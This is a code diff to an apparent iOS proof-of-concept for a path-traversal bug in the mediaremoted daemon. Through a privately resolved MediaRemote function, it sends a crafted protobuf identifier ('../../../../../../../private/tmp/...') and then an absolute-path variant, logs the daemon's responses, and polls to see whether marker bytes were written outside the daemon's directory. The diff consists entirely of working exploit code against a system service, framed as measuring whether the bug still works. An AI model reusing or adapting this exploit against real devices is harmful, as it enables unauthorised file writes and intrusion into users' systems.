@@ -54,6 +54,7 @@ NSString *ModMediaRemoteDD(void) {
     // write destination after 6 traversals from its own cwd (as published)
     NSString *name = [NSString stringWithFormat:@"rs43723_%ld", (long)time(NULL)];
     NSString *target = [NSString stringWithFormat:@"/private/tmp/%@", name];
+    NSString *targetAbs = target;   // the same path, sent verbatim as the identifier
     NSString *identifier = [NSString stringWithFormat:@"../../../../../../../private/tmp/%@", name];
 
     // marker: recognisable bytes, so a read-back is unambiguous
@@ -64,16 +65,52 @@ NSString *ModMediaRemoteDD(void) {
     [proto appendData:pb_field(2, [[identifier dataUsingEncoding:NSUTF8StringEncoding] copy])];
 
     struct timespec t0; clock_gettime(CLOCK_MONOTONIC, &t0);
+    // the public PoC ignores the completion; on iOS the daemon answers with an error
+    // (mediaremoted verifies com.apple.mediaremote.send-commands since 15.4-class
+    // builds), so the RESPONSE is the measurement that separates "denied" from
+    // "accepted but wrote elsewhere".
     fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto },
-       dispatch_get_main_queue(), ^(NSDictionary *r) {});
+       dispatch_get_main_queue(), ^(NSDictionary *r) {
+        if (r.count)
+            AvePost([NSString stringWithFormat:@"43723: command response: %@", r]);
+        else
+            AvePost(@"43723: command response: (empty) - the daemon took the message silently");
+    });
     AvePost([NSString stringWithFormat:@"43723: command 136 sent, identifier=%@", identifier]);
 
-    // poll: appearance, ownership, readability, survival
+    // reachability probe: GetNowPlayingInfo answers from the same daemon.
+    typedef void (*gni_fn)(dispatch_queue_t, void (^)(CFDictionaryRef));
+    gni_fn gni = (gni_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteGetNowPlayingInfo");
+    if (gni) {
+        gni(dispatch_get_main_queue(), ^(CFDictionaryRef info) {
+            AvePost([NSString stringWithFormat:@"43723: GetNowPlayingInfo -> %@",
+                     info ? (__bridge NSDictionary *)info : @"(nil answer)"]);
+        });
+    } else {
+        AvePost(@"43723: MRMediaRemoteGetNowPlayingInfo not exported on this build");
+    }
+
+    // second send: the identifier verbatim as an absolute path - if this build's
+    // daemon no longer traverses, THIS is the one that writes.
+    NSMutableData *proto2 = [NSMutableData dataWithData:pb_field(1, marker)];
+    [proto2 appendData:pb_field(2, [[targetAbs dataUsingEncoding:NSUTF8StringEncoding] copy])];
+    fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto2 },
+       dispatch_get_main_queue(), ^(NSDictionary *r) {
+        if (r.count)
+            AvePost([NSString stringWithFormat:@"43723: absolute-identifier response: %@", r]);
+        else
+            AvePost(@"43723: absolute-identifier response: (empty)");
+    });
+    AvePost([NSString stringWithFormat:@"43723: absolute-identifier sent: %@", targetAbs]);
+
+    // poll: appearance, ownership, readability, survival - BOTH the traversal target
+    // and the plain absolute path (in case the daemon no longer traverses on this
+    // build and takes the identifier verbatim).
     BOOL appeared = NO; int appeared_ms = -1; int gone_ms = -1;
     struct stat st; memset(&st, 0, sizeof st);
     NSString *readback = nil;
     for (int i = 0; i < 400; i++) {          // up to ~2 s of polling
-        if (stat(target.UTF8String, &st) == 0) {
+        if (stat(target.UTF8String, &st) == 0 || stat(targetAbs.UTF8String, &st) == 0) {
             if (!appeared) {
                 appeared = YES;
                 struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
